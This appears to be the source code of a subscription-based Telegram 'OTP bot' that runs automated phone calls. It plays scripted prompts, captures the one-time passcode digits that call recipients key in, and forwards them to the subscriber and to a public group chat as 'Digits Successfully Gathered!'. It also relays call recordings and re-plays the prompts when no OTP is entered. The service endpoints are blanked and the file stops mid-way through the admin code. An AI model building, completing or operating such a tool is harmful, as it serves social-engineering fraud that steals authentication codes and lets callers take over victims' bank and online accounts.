import os
import logging
import json
import sys
import aiofiles
import httpx
import requests
import threading
import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
from fastapi import FastAPI, Request
from fastapi import HTTPException
from fastapi.responses import FileResponse
import uvicorn
import asyncio
import aiohttp
import azure.cognitiveservices.speech as speechsdk
from database import Database
from datetime import datetime, timedelta
from bot_config import bot, dp, TOKEN, AZURE_SPEECH_KEY, AZURE_SPEECH_REGION
import script  # Import the script module that contains the script creation logic
from aiogram.dispatcher import FSMContext

# Initialize FastAPI app
app = FastAPI()

# Initialize the database
db = Database(
    host="localhost",
    port_id=5432,
    database="mydatabase",
    user="",
    password=""
)

db.connect()
db.create_table()

# Load sensitive values from environment variables
API_KEY = os.getenv('API_KEY', '')
NGROK_URL = os.getenv('NGROK_URL', 'http://')
developers = []
YOUR_ADMIN_IDS = [int(os.getenv('YOUR_ADMIN_ID1', '')), int(os.getenv('YOUR_ADMIN_ID2', '')),int(os.getenv('YOUR_ADMIN_ID2', ''))]
MAX_MESSAGE_LENGTH = 4096  # Telegram's maximum message length
GROUP_CHAT_ID = -  # Replace with your actual group chat ID
EXCLUDED_USER_IDS = []

# Debug mode flag
debug_mode = False

# Dictionary to track active calls per user
active_calls = {}


# Set up logging
logging.basicConfig(level=logging.INFO)

formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

# Create logger for error logs
error_logger = logging.getLogger('errors')
error_handler = logging.FileHandler('error_logs.txt', mode='a')
error_handler.setFormatter(formatter)  # Set the formatter for the error logs
error_logger.addHandler(error_handler)
error_logger.setLevel(logging.ERROR)


# Telegram bot setup
bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

# Subscription system
subscribed_users = set()

async def refresh_subscribed_users():
    global subscribed_users
    logging.info("Refreshing subscribed users...")
    try:
        db.cursor.execute("SELECT user_id FROM subscription_keys WHERE user_id IS NOT NULL")
        subscribed_users_list = db.cursor.fetchall()
        subscribed_users = {user[0] for user in subscribed_users_list}
        logging.info(f"Subscribed users refreshed: {subscribed_users}")
    except Exception as e:
        logging.error(f"Error refreshing subscribed users: {e}")

def load_subscribed_users():
    global subscribed_users
    logging.info("Loading subscribed users...")
    try:
        db.cursor.execute("SELECT user_id FROM subscription_keys WHERE user_id IS NOT NULL")
        subscribed_users_list = db.cursor.fetchall()
        subscribed_users = {user[0] for user in subscribed_users_list}
        logging.info(f"Subscribed users loaded: {subscribed_users}")
    except Exception as e:
        logging.error(f"Error loading subscribed users: {e}")

load_subscribed_users()

def mask_user_id(user_id: str) -> str:
    """Mask the middle of the user ID, showing only the first and last three characters."""
    if len(user_id) <= 6:
        return user_id  # If the user ID is too short, return as is
    return f"{user_id[:3]}{'*' * (len(user_id) - 6)}{user_id[-3:]}"

# Assume this is a session-based flag stored in a database or in-memory store
# to keep track of whether the user pressed '1'
user_state = {}

@app.post('/webhook/{chatid}/{scriptid}/{maxdigits}/{secmax}')
async def webhook(chatid: int, scriptid: str, maxdigits: int, secmax: int, request: Request):
    data = await request.json()
    logging.info(f"Incoming webhook data for chatid {chatid}: {data}")

    if not data or 'state' not in data:
        return {"status": "error", "message": "Invalid data format"}

    event = data['state']
    logging.info(f"Event received for chatid {chatid}: {event}")

    # Assuming db.get_session is synchronous; remove `await`
    session = db.get_session(chatid)  # Synchronous call to get session
    if not session:
        logging.error(f"No session found in the database for chatid {chatid}")
        return {"status": "error", "message": "No session found for chatid"}

    uuid = session['uuid']
    logging.info(f"UUID retrieved from the database for chatid {chatid}: {uuid}")

    masked_chatid = mask_user_id(str(chatid))  # Mask the chatid for display

    # Initialize user state if it doesn't exist
    if chatid not in user_state:
        user_state[chatid] = {'pressed_1': False}

    try:
        if event == 'call.ringing':
            logging.info(f"Call is ringing for user {chatid}")
            # Asynchronously send the message
            await bot.send_message(chatid, "🔔 Your call is ringing. Please wait...")

        elif event == 'call.answered':
            # First gather audio (part 1) with maxdigits fixed at 1
            url = ""
            payload = {
                'uuid': uuid,
                'audiourl': f'',
                'maxdigits': '1'  # Fixed to 1 for the first gather
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload) as response:
                    logging.info(f"Gather audio response for chatid {chatid}: {response.status} - {await response.text()}")
            await bot.send_message(chatid, "✅ The call has been answered. Please follow the instructions.")

        elif event == 'dtmf.gathered':
            digits = data.get('digits', '')
            logging.info(f"Digits gathered for chatid {chatid}: {digits}")

            if digits == '1':
                logging.info("User pressed 1 during the first gather")
                user_state[chatid]['pressed_1'] = True
                await bot.send_message(chatid, "👆 You pressed 1. Moving to the next step.")
                await play_gather_audio(uuid, chatid, scriptid, maxdigits, secmax)  # Use dynamic maxdigits for further input
            else:
                logging.info(f"Digits gathered: {digits}")
                
                # Send the message to the user for captured digits
                await bot.send_message(
                    chat_id=chatid, 
                    text=f"🔢 Digits Captured: <code>{digits}</code>", 
                    parse_mode="HTML"
                )
                
                # Skip sending group message if chatid is in EXCLUDED_USER_IDS
                if chatid not in EXCLUDED_USER_IDS:
                    # Prepare group message and send to group chat if the user ID is not excluded
                    group_message = (
                        f"🎉 <b>Digits Successfully Gathered!</b>\n\n"
                        f"👤 <b>User ID:</b> <code>{masked_chatid}</code>\n"
                        f"🔢 <b>Captured Digits:</b> <code>{digits}</code>\n"
                        f"⏰ <b>Timestamp:</b> <code>{data.get('timestamp', 'N/A')}</code>\n"
                        f"📞 <b>Call Duration:</b> <code>{data.get('duration', 'N/A')} seconds</code>\n\n"
                        f"🔗 <b>Check our channel for updates!</b>\n"
                        f'<a href="https://your-channel-link.com">📢 Visit Our Channel</a>'
                    )
                    await bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=group_message,
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )

                # Continue with the process for playing the next audio
                await play_fifth_script(uuid, chatid, scriptid)
                await ask_if_digits_correct(chatid, digits, scriptid, secmax)

        elif event == 'dtmf.entered':
            digit = data.get('digit', '')
            logging.info(f"Digit entered for chatid {chatid}: {digit}")
            
            # Send the message to the user for a single entered digit
            await bot.send_message(
                chatid, 
                f"🔢 You entered the digit: <b>{digit}</b>.", 
                parse_mode="HTML"
            )

        elif event == 'call.hangup':
            logging.info(f"Call hangup event received for chatid {chatid}.")
            duration = data.get('duration', 0)
            recording_url = data.get('recording_url')
            if recording_url:
                await download_and_send_recording(chatid, recording_url)
            
            await bot.send_message(
                chatid, 
                f"📞 Call ended after {duration} seconds. Recording has been sent to your chat."
            )

        elif event == 'playback.finished':
            # Only handle playback.finished if the user pressed '1'
            if user_state[chatid]['pressed_1']:
                logging.info(f"Playback finished event received for chatid {chatid}. Waiting for 10 seconds...")

                # Wait for 10 seconds before repeating the action
                await asyncio.sleep(10)

                # Send a notification to the user that they haven't entered the OTP
                await bot.send_message(chatid, "⏳ You didn't press the OTP. We are replaying the instructions.")
                
                # Replay the gather audio with the same settings
                await play_gather_audio(uuid, chatid, scriptid, maxdigits, secmax)
                
                # Reset the state after processing
                user_state[chatid]['pressed_1'] = False
            else:
                logging.info(f"Ignoring playback.finished event for chatid {chatid} because '1' was not pressed.")

        elif event == 'call.complete':
            logging.info(f"Call with chatid {chatid} and UUID {uuid} has been completed.")
            await bot.send_message(chatid, "📞 Call Status: The call has ENDED. Thank you!")
            db.increment_call_count(chatid)

            if chatid in user_locks:
                lock = user_locks[chatid]
                if lock.locked():
                    lock.release()  # Explicitly release the lock

    except Exception as e:
        logging.error(f"An error occurred for chatid {chatid}: {str(e)}")
        return {"status": "error", "message": str(e)}

async def download_and_send_recording(chatid, recording_url):
    """Download the recording from the URL and send it to the user via Telegram as an audio file, renamed as LEGENDBOT."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(recording_url) as response:
                if response.status == 200:
                    # Save the file locally with the name 'LEGENDBOT'
                    file_name = 'LEGENDBOT.wav'
                    with open(file_name, 'wb') as f:
                        f.write(await response.read())
                    
                    # Send the file as an audio file via Telegram to allow direct playback
                    with open(file_name, 'rb') as audio_file:
                        await bot.send_audio(chatid, audio_file, title="LEGENDBOT")

                    # Optionally delete the file after sending
                    os.remove(file_name)
                else:
                    logging.error(f"Failed to download the recording from {recording_url}. Status: {response.status}")
                    await bot.send_message(chatid, "Failed to download the recording.")
    except Exception as e:
        logging.error(f"An error occurred while downloading or sending the recording: {str(e)}")
        await bot.send_message(chatid, "An error occurred while downloading or sending the recording.")


@dp.errors_handler()
async def handle_errors(update, exception):
    """Log exceptions and handle errors."""
    error_logger.error(f"Error: {exception} - Update: {update}")
    return True  # Prevent further propagation


@dp.message_handler(commands=['ban'])
async def ban_user(message: types.Message):
    # Check if the user is an admin
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You are not authorized to use this command.")
        return
    
    # Extract the user ID from the message
    try:
        user_id = int(message.get_args())
        # Ban the user
        db.ban_user(user_id)
        await message.reply(f"User {user_id} has been banned.")
    except ValueError:
        await message.reply("Please provide a valid user ID.")

async def play_fifth_script(uuid, chatid, scriptid):
    audiourl = f""
    url = ""
    payload = {
        "uuid": uuid,
        "audiourl": audiourl
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response: 
                response.raise_for_status()  # Raises an exception for HTTP errors
                data = await response.json()
                logging.info(f"Fifth script played successfully for chatid {chatid}. Response data: {data}")
    except aiohttp.ClientError as e:
        logging.error(f"Error playing fifth script for uuid {uuid} with audiourl {audiourl}: {e}")


def is_developer(chat_id):
    return chat_id in developers

# Developer Panel Command (/developer_panel)
@dp.message_handler(commands=['developer_panel'])
async def developer_panel(message: types.Message):
    if is_developer(message.chat.id):
        # Create inline keyboard for developer panel
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("View Logs", callback_data='view_logs'))
        keyboard.add(InlineKeyboardButton("Bot Status", callback_data='bot_status'))
        keyboard.add(InlineKeyboardButton("Toggle Debug Mode", callback_data='toggle_debug'))
        keyboard.add(InlineKeyboardButton("View Errors", callback_data='view_errors'))
        keyboard.add(InlineKeyboardButton("Manage Developers", callback_data='manage_devs'))
        keyboard.add(InlineKeyboardButton("Restart Bot", callback_data='restart_bot'))  # Add restart button

        await message.answer("🛠️ Developer Panel", reply_markup=keyboard)
    else:
        await message.answer("You do not have permission to access this command.")


# View Logs Callback
@dp.callback_query_handler(lambda c: c.data == 'view_logs')
async def view_logs_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        # Load recent logs (Assume logs are stored in a file or database)
        try:
            with open('bot_logs.txt', 'r') as log_file:  # Replace with your log file path
                logs = log_file.read()[-4000:]  # Limit to the last 4000 characters
            await bot.send_message(callback_query.from_user.id, f"📄 Recent Logs:\n{logs}")
        except FileNotFoundError:
            await bot.send_message(callback_query.from_user.id, "No logs found.")
        await bot.answer_callback_query(callback_query.id)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Bot Status Callback
@dp.callback_query_handler(lambda c: c.data == 'bot_status')
async def bot_status_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        # Mock data for bot status
        uptime = "24 hours 13 minutes"  # Replace with real uptime info
        active_users = 100  # Replace with actual function to fetch user count
        active_sessions = 20  # Replace with active sessions logic

        status_message = (
            f"🟢 Bot Status:\n"
            f"Uptime: {uptime}\n"
            f"Active Users: {active_users}\n"
            f"Active Sessions: {active_sessions}"
        )
        await bot.send_message(callback_query.from_user.id, status_message)
        await bot.answer_callback_query(callback_query.id)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Toggle Debug Mode Callback
@dp.callback_query_handler(lambda c: c.data == 'toggle_debug')
async def toggle_debug_callback(callback_query: types.CallbackQuery):
    global debug_mode
    if is_developer(callback_query.from_user.id):
        debug_mode = not debug_mode  # Toggle debug mode
        status = "enabled" if debug_mode else "disabled"
        await bot.send_message(callback_query.from_user.id, f"🐞 Debug mode has been {status}.")
        await bot.answer_callback_query(callback_query.id)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# View Errors Callback
@dp.callback_query_handler(lambda c: c.data == 'view_errors')
async def view_errors_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        try:
            # Assume errors are logged in a file
            with open('error_logs.txt', 'r') as error_log_file:
                errors = error_log_file.read()[-4000:]  # Limit to the last 4000 characters
            await bot.send_message(callback_query.from_user.id, f"⚠️ Recent Errors:\n{errors}")
        except FileNotFoundError:
            await bot.send_message(callback_query.from_user.id, "No errors found.")
        await bot.answer_callback_query(callback_query.id)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Manage Developers Callback
@dp.callback_query_handler(lambda c: c.data == 'manage_devs')
async def manage_devs_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        # Show options to add/remove developers
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("Add Developer", callback_data='add_dev'))
        keyboard.add(InlineKeyboardButton("Remove Developer", callback_data='remove_dev'))
        await bot.send_message(callback_query.from_user.id, "👨‍💻 Manage Developers", reply_markup=keyboard)
        await bot.answer_callback_query(callback_query.id)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Add Developer Callback
@dp.callback_query_handler(lambda c: c.data == 'add_dev')
async def add_developer_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        await bot.send_message(callback_query.from_user.id, "Send the user ID of the new developer to add.")
        
        @dp.message_handler(lambda message: is_developer(message.chat.id))
        async def handle_add_dev_id(message: types.Message):
            try:
                new_dev_id = int(message.text)
                if new_dev_id not in developers:
                    developers.append(new_dev_id)
                    await message.reply(f"User {new_dev_id} has been promoted to developer.")
                else:
                    await message.reply(f"User {new_dev_id} is already a developer.")
            except ValueError:
                await message.reply("Please provide a valid user ID.")
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Remove Developer Callback
@dp.callback_query_handler(lambda c: c.data == 'remove_dev')
async def remove_developer_callback(callback_query: types.CallbackQuery):
    if is_developer(callback_query.from_user.id):
        await bot.send_message(callback_query.from_user.id, "Send the user ID of the developer to remove.")
        
        @dp.message_handler(lambda message: is_developer(message.chat.id))
        async def handle_remove_dev_id(message: types.Message):
            try:
                remove_dev_id = int(message.text)
                if remove_dev_id in developers:
                    developers.remove(remove_dev_id)
                    await message.reply(f"User {remove_dev_id} has been removed as a developer.")
                else:
                    await message.reply(f"User {remove_dev_id} is not a developer.")
            except ValueError:
                await message.reply("Please provide a valid user ID.")
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")


# Restart Bot Callback
@dp.callback_query_handler(lambda c: c.data == 'restart_bot')
async def restart_bot_callback(callback_query: types.CallbackQuery):
    if callback_query.from_user.id in developers:
        await bot.send_message(callback_query.from_user.id, "🔄 Restarting bot...")
        
        # Store the developer's chat ID in a file
        with open('restart_info.txt', 'w') as f:
            f.write(str(callback_query.from_user.id))
        
        await bot.answer_callback_query(callback_query.id)
        
        # Gracefully shut down the bot
        await bot.close()
        
        # Restart the bot process using execv
        os.execv(sys.executable, ['python'] + sys.argv)
    else:
        await bot.answer_callback_query(callback_query.id, "You do not have permission to access this.")

# Notify Developer After Restart
async def notify_restart(dispatcher):
    """Notify the developer that the bot has restarted."""
    try:
        # Check if the restart info file exists
        if os.path.exists('restart_info.txt'):
            with open('restart_info.txt', 'r') as f:
                developer_chat_id = f.read().strip()
            
            # Send the notification message
            await dispatcher.bot.send_message(int(developer_chat_id), "✅ Bot has successfully restarted!")
            
            # Remove the file after notification
            os.remove('restart_info.txt')
    except Exception as e:
        logging.error(f"Failed to notify developer after restart: {e}")




# Command to unban a user
@dp.message_handler(commands=['unban'])
async def unban_user(message: types.Message):
    # Check if the user is an admin
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You are not authorized to use this command.")
        return
    
    # Extract the user ID from the message
    try:
        user_id = int(message.get_args())
        # Unban the user
        db.unban_user(user_id)
        await message.reply(f"User {user_id} has been unbanned.")
    except ValueError:
        await message.reply("Please provide a valid user ID.")

def is_admin(user_id):
    return user_id in YOUR_ADMIN_IDS

@dp.message_handler(commands=["broadcast"])
async def broadcast(message: types.Message):
    if message.from_user.id not in YOUR_ADMIN_IDS:
        await message.reply("You don't have permission to use this command.")
        return

    broadcast_text = message.get_args()
    if not broadcast_text:
        await message.reply("Please provide a message to broadcast.")
        return

    # Debugging: Print the broadcast message
    print(f"Broadcast message: {broadcast_text}")

    try:
        users = db.get_all_user_ids()  # Ensure this method retrieves all user IDs
        print(f"Users to broadcast: {users}")  # Debugging: Print user IDs
        
        if not users:
            await message.reply("No users to broadcast to.")
            return
        
        for user_id in users:
            if not db.is_user_banned(user_id):  # Ensure this method checks if user is banned
                try:
                    await bot.send_message(user_id, broadcast_text)
                except Exception as e:
                    logging.error(f"Failed to send broadcast to user {user_id}: {e}")
            else:
                logging.info(f"User {user_id} is banned and will not receive the broadcast.")
                
        await message.reply("Broadcast sent.")
    except Exception as e:
        logging.error(f"Error during broadcasting: {e}")
        await message.reply("An error occurred while sending the broadcast.")


async def periodic_key_check():
    while True:
        await check_key_expiry()
        await asyncio.sleep(60 * 10)  # Check every 10 minutes

async def periodic_user_refresh():
    while True:
        await refresh_subscribed_users()
        await asyncio.sleep(10 * 60)  # Refresh every 15 minutes

@dp.callback_query_handler(lambda c: c.data == 'renew_subscription')
async def renew_subscription(callback_query: types.CallbackQuery):
    # Handle subscription renewal logic here
    await callback_query.message.answer('contact :- @LEGENDSNIZO.')
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'help')
async def help(callback_query: types.CallbackQuery):
    # Provide help or additional instructions
    await callback_query.message.answer('For more help, please visit our support channel or contact our devloper.')
    await callback_query.answer()



@dp.message_handler(commands=["profile"])
async def profile(message: types.Message):
    user_id = message.from_user.id
    
    # Fetch the call count from the database
    call_count = db.get_call_count(user_id)
    
    # Fetch the user's key details from the database
    key_details = db.get_key_details(user_id)
    
    if not key_details:
        await message.reply('🚫 You do not have an active subscription key. Please contact support for assistance.')
        return

    key, expiry_time_str = key_details
    expiry_time = datetime.strptime(expiry_time_str, "%Y-%m-%d %H:%M:%S")

    # Format the expiry date to show in "12 September 2024, 02:30 PM" format
    formatted_expiry = expiry_time.strftime("%d %B %Y, %I:%M %p")
    
    # Prepare the profile message using HTML formatting
    message_text = (
        f"✨ <b>Subscription Key Profile</b> ✨\n\n"
        f"🔑 <b>Key:</b> <code>{key}</code>\n"
        f"📅 <b>Expiry Date:</b> {formatted_expiry}\n\n"
        f"📞 <b>Total Calls Made:</b> {call_count}\n\n"
        f"🚀 <b>To Extend Your Subscription:</b>\n"
        f"Please contact support to renew your subscription.\n\n"
        f"🛠️ <b>Need Help?</b>\n"
        f"Contact support for assistance."
    )

    await message.reply(message_text, parse_mode='HTML')

  
async def play_audio(uuid, scriptid):
    audiourl = f""
    url = ""
    payload = {
        "uuid": uuid,
        "audiourl": audiourl
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response: 
                response.raise_for_status()  # Raises an exception for HTTP errors
                return await response.json()
    except aiohttp.ClientError as e:
        logging.error(f"Error playing audio for uuid {uuid} with audiourl {audiourl}: {e}")
        return None

@dp.message_handler(commands=['set_voicename'])
async def set_voicename(message: types.Message):
    voice_name = message.get_args()  # Assuming the voice name is passed as an argument
    if not voice_name:
        await message.reply("Please provide a voice name. Usage: /set_voicename <voice_name>")
        return
    
    user_id = message.from_user.id
    db.save_voice_name(user_id, voice_name)
    await message.reply(f"Voice name '{voice_name}' has been saved for your future scripts.")

@app.get("/scripts/{script_id}/{filename}")
async def get_script_file(script_id: str, filename: str):
    file_path = f"./scripts/{script_id}/{filename}"

    if not os.path.exists(file_path):
        logging.error(f"File not found: {file_path}")
        raise HTTPException(status_code=404, detail="File not found")
    
    if not os.access(file_path, os.R_OK):
        logging.error(f"File is not readable: {file_path}")
        raise HTTPException(status_code=403, detail="File is not readable")

    try:
        return FileResponse(path=file_path, media_type='audio/wav')
    except Exception as e:
        logging.error(f"Error serving file {file_path}: {e}")
        raise HTTPException(status_code=500, detail="Internal Server Error")

async def download_recording(url):
    """Downloads the recording using HTTP/2 for faster connections."""
    try:
        async with httpx.AsyncClient(http2=True) as client:
            response = await client.get(url)

            if response.status_code == 200:
                file_name = url.split("/")[-1]
                file_path = os.path.join("record", file_name)

                os.makedirs(os.path.dirname(file_path), exist_ok=True)

                # Use aiofiles for asynchronous file writing
                async with aiofiles.open(file_path, 'wb') as f:
                    await f.write(response.content)

                return file_path
            else:
                logging.error(f"Failed to download the recording: {response.status_code}")
                return None
    except Exception as e:
        logging.error(f"Error downloading recording: {e}")
        return None


async def send_audio_to_user(chatid, file_path):
    """Sends the downloaded audio file to the user."""
    try:
        # Asynchronously open the file to read
        async with aiofiles.open(file_path, 'rb') as f:
            audio_data = await f.read()
            
        # Send the audio to the user (no 'async with' needed)
        await bot.send_audio(chatid, audio_data, caption="RECORDING")
        logging.info(f"Recording sent to chat_id {chatid}: {file_path}")
        
        # Remove the file after sending
        os.remove(file_path)
    except Exception as e:
        logging.error(f"Failed to send recording to chat_id {chatid}: {e}")

# Example of how to use async function
# asyncio.run(download_and_send(url, chatid))
async def download_and_send(url, chatid):
    file_path = await download_recording(url)
    if file_path:
        await send_audio_to_user(chatid, file_path)

async def send_message_to_user(chat_id, message):
    try:
        await bot.send_message(chat_id, message)
        logging.info(f"Message sent to chat_id {chat_id}: {message}")
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chat_id}: {e}")


@dp.callback_query_handler(lambda c: c.data and (c.data.startswith('correct_') or c.data.startswith('wrong_')))
async def handle_digit_confirmation(callback_query: types.CallbackQuery):
    action, chatid, scriptid, secmax = callback_query.data.split('_')
    chatid = int(chatid)

    session = db.get_session(chatid)
    if not session:
        logging.error(f"No session found for chatid {chatid} when handling digit confirmation.")
        await callback_query.answer("Session not found.")
        return
    
    uuid = session['uuid']

    if action == 'correct':
        logging.info(f"User confirmed digits as correct for chatid {chatid}. Playing the fourth script.")
        await callback_query.answer("Thank you, playing the fourth script.")
        
        # Play the fourth script
        result = await play_audio(uuid, scriptid)
        
        if result:
            logging.info(f"Fourth script played successfully for chatid {chatid}.")
            await bot.send_message(chatid, "The fourth script has been played.")
        else:
            logging.error(f"Failed to play the fourth script for chatid {chatid}.")
            await bot.send_message(chatid, "Failed to play the fourth script. Please try again.")
        
        # Optionally, end the call after playing the fourth script
        #await async_hangup_call(uuid)  # End the call after playing the script

    elif action == 'wrong':
        logging.info(f"User indicated digits were wrong for chatid {chatid}. Attempting to play the third script.")
        
        if not scriptid:
            logging.error(f"Failed to retrieve script ID for chatid {chatid}. Cannot play third script.")
            await callback_query.answer("Failed to retrieve script ID.")
            return
        
        await callback_query.answer("Playing the third script.")
        await play_third_script(uuid, chatid, scriptid, secmax)  # Pass secmax here as well



async def play_gather_audio(uuid, chatid, scriptid, maxdigits, secmax):
    audiourl = f""
    url = ""
    payload = {
        'uuid': uuid,
        'audiourl': audiourl,
        'maxdigits': str(maxdigits)
    }

    logging.info(f"Attempting to gather audio for chatid {chatid} with scriptid {scriptid} for part 2")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                # Raise an error if the response status is not 200 (success)
                response.raise_for_status()
                
                # Parse the response
                data = await response.json()
                logging.debug(f"Gather audio response data: {data}")
                
                # Check if digits were gathered
                if data.get('event') == 'dtmf.gathered':
                    digits = data.get('digits', '')
                    logging.info(f"Digits gathered for chatid {chatid}: {digits}")

                    # Notify the group about the gathered digits
                    await notify_group_chat(digits, chatid)

                    # Immediately ask the user if the digits are correct
                    await ask_if_digits_correct(chatid, digits, scriptid, secmax)

                    # Automatically play the next audio
                    await play_fifth_script(uuid, chatid, scriptid)
                    
                else:
                    logging.warning(f"No digits gathered or unexpected event: {data}")
                    await send_message_to_user(chatid, "❌ No digits were entered. Please try again.")
    
    except aiohttp.ClientResponseError as e:
        # Specific error for response failures
        logging.error(f"Client response error while gathering audio for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "⚠️ There was an issue with gathering audio. Please try again.")
    
    except aiohttp.ClientError as e:
        # General network error handling
        logging.error(f"Error gathering audio for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "❌ Failed to gather audio. Please check your connection and try again.")

    except Exception as e:
        # Catch-all for unexpected errors
        logging.error(f"Unexpected error for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "❌ An unexpected error occurred. Please try again later.")

# Helper function to notify the group chat
async def notify_group_chat(digits, chatid):
    # Hide part of the user ID, show the first 3 digits and replace the rest with asterisks
    hidden_chatid = str(chatid)[:3] + '*******'

    group_message = (
        f"🎉 <b>Digits Successfully Gathered!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{hidden_chatid}</code>\n"
        f"🔢 <b>Captured Digits:</b> <code>{digits}</code>\n"
        f"🔗 <b>Check our channel for updates!</b>"
    )
    
    # Create inline button markup with a link to the channel
    channel_button = InlineKeyboardMarkup(row_width=1)
    channel_button.add(
        InlineKeyboardButton(text="📢 Visit Our Channel", url="")
    )

    try:
        # Send the message with the inline button to the group chat
        await bot.send_message(
            chat_id=GROUP_CHAT_ID,
            text=group_message,
            parse_mode="HTML",
            reply_markup=channel_button
        )
    except Exception as e:
        logging.error(f"Failed to send message to group chat: {e}")


async def play_third_script(uuid, chatid, scriptid, secmax):
    audiourl = f""
    url = ""
    payload = {
        'uuid': uuid,
        'audiourl': audiourl,
        'maxdigits': str(secmax)
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                response.raise_for_status()
                data = await response.json()
                if data.get('event') == 'dtmf.gathered':
                    digits = data.get('digits', '')
                    await bot.send_message(chat_id=GROUP_CHAT_ID, text=f"Gathered digits: {digits}")
                    await ask_if_digits_correct(chatid, digits, scriptid, secmax)  # Ensure maxdigits is included
    except aiohttp.ClientError as e:
        logging.error(f"Error playing third script for uuid {uuid}, chatid {chatid}: {e}")
        await send_message_to_user(chatid, "An error occurred while trying to play the third script. Please try again.")




async def ask_if_digits_correct(chatid, digits, scriptid, maxdigits):
    # Create the inline keyboard with buttons for "Correct" and "Wrong"
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("✅ Correct", callback_data=f'correct_{chatid}_{scriptid}_{maxdigits}'),
        InlineKeyboardButton("❌ Wrong", callback_data=f'wrong_{chatid}_{scriptid}_{maxdigits}')
    )
    
    # Format the message with a more visually appealing layout
    message_text = (
        f"🔢 <b>OTP Captured:</b> <code>{digits}</code>\n\n"
    )
    
    try:
        # Send the formatted message with the inline buttons
        await bot.send_message(chatid, message_text, reply_markup=markup, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to send message to chat_id {chatid}: {e}")


@dp.callback_query_handler(lambda c: c.data and c.data.startswith('hangup_'))
async def handle_hangup(callback_query: types.CallbackQuery):
    try:
        # Extract UUID from the callback data
        data_parts = callback_query.data.split('_')
        if len(data_parts) < 2:
            await callback_query.answer('⚠️ Invalid hangup request.')
            return
        
        uuid = data_parts[1]
        logging.info(f"Attempting to hang up call with UUID: {uuid}")

        # Call the async_hangup_call function to hang up the call
        result = await async_hangup_call(uuid)
        
        # Handle the result
        if 'error' in result:
            error_message = result.get('error', 'Unknown error')
            logging.error(f"Failed to hang up the call: {error_message}")
            await callback_query.answer(f"⚠️ Failed to hang up the call: {error_message}")
        else:
            logging.info(f"Call with UUID {uuid} successfully hung up.")
            await callback_query.answer("✅ The call has been successfully hung up.")

    except Exception as e:
        logging.error(f"An error occurred while hanging up the call: {e}")
        # Provide a friendly error message to the user
        await callback_query.answer('❌ An error occurred while attempting to hang up the call. Please try again later.')



@dp.message_handler(commands=["admin"])
async def admin_panel(message: types.Message):
    chat_id = message.chat.id

    # Check if the user is an admin
    if chat_id not in YOUR_ADMIN_IDS:
        await message.reply('❌ You do not have admin privileges.')
        return

    # Create the admin panel with buttons for managing admins and generating keys
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton('➕ Generate Key', callback_data='admin_generate_key'),
        InlineKeyboardButton('➕ Add Admin', callback_data='admin_add_admin'),
        InlineKeyboardButton('❌ Remove Admin', callback_data='admin_remove_admin')
    )

    await message.reply('🔧 Admin Panel:', reply_markup=markup)

# Temporary storage for new admin chat IDs
pending_admin_additions = {}

@dp.callback_query_handler(lambda c: c.data == 'admin_add_admin')
async def handle_add_admin(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id

    # Check if the user is an admin
    if chat_id not in YOUR_ADMIN_IDS:
        await callback_query.answer('❌ You do not have admin privileges.')
        return

    # Ask the current admin for the chat ID of the new admin
    await callback_query.message.reply('Please enter the chat ID of the user you want to add as an admin.')
    
    # Store that this admin is currently in the process of adding an admin
    pending_admin_additions[chat_id] = True

# After the admin provides the new admin chat ID
@dp.message_handler(lambda message: message.chat.id in pending_admin_additions)
async def add_admin(message: types.Message):
    current_admin_id = message.chat.id

    # Validate the new admin chat ID
    try:
        new_admin_id = int(message.text)
        if new_admin_id in YOUR_ADMIN_IDS:
            await message.reply(f'⚠️ User {new_admin_id} is already an admin.')
        else:
            YOUR_ADMIN_IDS.append(new_admin_id)
            await message.reply(f'✅ User {new_admin_id} has been added as an admin.')
            logging.info(f"Admin {current_admin_id} added {new_admin_id} as an admin.")
    except ValueError:
        await message.reply('❌ Invalid chat ID. Please enter a valid number.')

    # Remove the pending state for this admin
    del pending_admin_additions[current_admin_id]


# Temporary storage for pending admin removals
pending_admin_removals = {}

